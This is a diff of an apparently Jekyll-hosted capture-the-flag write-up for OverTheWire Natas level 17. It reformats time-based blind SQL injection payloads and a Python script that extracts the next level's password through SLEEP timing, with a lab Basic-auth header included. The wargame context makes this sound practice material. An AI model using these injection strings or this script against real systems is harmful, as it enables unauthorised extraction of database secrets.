@@ -86,8 +86,9 @@ As expected, the result is exactly the same. Since this is a blind sql injection
 
 Next I try the following query:
 
-    Select * from users where username = "natas16"  AND LEFT(password, 1) COLLATE latin1_general_cs = "W" AND (SELECT SLEEP(5)) AND "1"="1";
-
+{% highlight sql %}
+Select * from users where username = "natas16"  AND LEFT(password, 1) COLLATE latin1_general_cs = "W" AND (SELECT SLEEP(5)) AND "1"="1";
+{% endhighlight %}
 
 And I get the following output:
 
@@ -95,7 +96,9 @@ And I get the following output:
 
 Here is the string that I will need to submit:
 
-    natas18"  AND LEFT(password, 1) COLLATE latin1_general_cs = "a" AND  (SELECT SLEEP(20)) AND "1"="1
+{% highlight sql %}
+natas18"  AND LEFT(password, 1) COLLATE latin1_general_cs = "a" AND  (SELECT SLEEP(20)) AND "1"="1
+{% endhighlight %}
 
 I capture a request in Burp and send it to the intruder but since this is a time base attack, I need to change the Number of threads to 1:
 
@@ -107,41 +110,42 @@ After running it I look at the response time and find the first letter of the pa
 
 Now lets script it!
 
-    import urllib
-    import urllib2
-    import time
+{% highlight python %}
+import urllib
+import urllib2
+import time
 
-    url = 'http://natas17.natas.labs.overthewire.org/index.php'
-    authorization = 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
+url = 'http://natas17.natas.labs.overthewire.org/index.php'
+authorization = 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
 
-    Chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
-    's','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L',
-    'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5',
-    '6','7','8','9']
+Chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
+'s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L',
+'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5',
+'6','7','8','9']
 
-    password = ""
+password = ""
 
-    #loop through possible length of password
-    for i in range(1, 33):
-        print "%d out of 32" % (i)
-        #loop through possible chars
-        for j in range(0,len(Chars)):
-            sqli = 'natas18"  AND LEFT(password, %d) COLLATE latin1_general_cs = "%s" AND  (SELECT SLEEP(10)) AND "1"="1' % (i,password + Chars[j])
-            values = {'username' : sqli}
-            data = urllib.urlencode(values)
-            req = urllib2.Request(url, data)
-            req.add_header('Authorization', authorization)
-            start = time.time()
-            response = urllib2.urlopen(req)
-            the_page = response.read()
-            end = time.time()
-            #print the_page
-            duration = end-start
-            if duration > 10:
-                password+=Chars[j]
-                print password
-                break
-
+#loop through possible length of password
+for i in range(1, 33):
+    print "%d out of 32" % (i)
+    #loop through possible chars
+    for j in range(0,len(Chars)):
+        sqli = 'natas18"  AND LEFT(password, %d) COLLATE latin1_general_cs = "%s" AND  (SELECT SLEEP(10)) AND "1"="1' % (i,password + Chars[j])
+        values = {'username' : sqli}
+        data = urllib.urlencode(values)
+        req = urllib2.Request(url, data)
+        req.add_header('Authorization', authorization)
+        start = time.time()
+        response = urllib2.urlopen(req)
+        the_page = response.read()
+        end = time.time()
+        #print the_page
+        duration = end-start
+        if duration > 10:
+            password+=Chars[j]
+            print password
+            break
+{% endhighlight %}
 
 The first time I run it I get a weird issue:
 
